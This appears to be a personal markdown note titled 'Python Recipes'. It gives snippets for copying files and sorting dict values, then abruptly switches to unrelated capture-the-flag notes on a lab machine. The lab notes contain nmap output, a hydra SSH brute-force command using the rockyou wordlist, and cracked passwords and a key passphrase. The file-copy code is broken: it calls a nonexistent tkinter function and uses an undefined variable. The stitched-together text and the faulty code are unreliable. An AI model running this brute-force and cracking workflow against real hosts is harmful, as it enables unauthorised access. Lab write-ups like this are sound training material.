---
title: Python Recipes
summary: A note about Python useful bits of code.
description: A note about Python useful bits of code.
tags:
  - python
---

# Files

---

### Copy Files

Source: [How To Copy Files - Intently](https://www.youtube.com/watch?v=vx9zFN8PxOA)

````python
from tkinter import filedialog
from pathlib import Path
import shutil

# Open a file explorer window to choose a file
src_path: str = filedialog.askopenfilename(title='Pick a file to copy')
# Open a file explorer window to choose a directory
dst_directory: str = filedialog.askopendirectory(title='Pick a destination')

# Path handle path regardless of the OS 
dst_path: Path = Path(directory) / f'copy.{src_path.split(".")[-1]}' 

# Copy a file without metadata
shutil.copyfile(src=src_path, dst=dst_path)
# Copy a file with metadata
shutil.copy2(src=src_path, dst=dst_path)
````

# Dict

---

### Sort Values in Reverse Order


````py
dict(sorted(myDict.items(), key=lambda x: x[1],reverse=True))
````

````py
import operator

dict(sorted(myDict.items(), key=operator.itemgetter(1),reverse=True))
````

-- NMAP :
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-17 22:13 CET
Nmap scan report for 10.10.51.214
Host is up (0.099s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8009/tcp open  ajp13?
8080/tcp open  http-proxy?
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

-- GOBUSTER :
/development/

-- /development :
dev.txt
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J

j.txt
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K

-- SMB:
staff.txt
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay

-- HYDRA :
hydra 10.10.51.214 -l "jan" -P /usr/share/wordlists/rockyou.txt ssh

\[22\]\[ssh\] host: 10.10.51.214   login: jan   password: armando

-- LINEPEAS.SH (on machine) :
Possible private SSH keys were found!
/home/kay/.ssh/id_rsa

-- JOHNTHERIPPER :
With Kay's Private Key
beeswax

-- KAY :
pass.bak
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
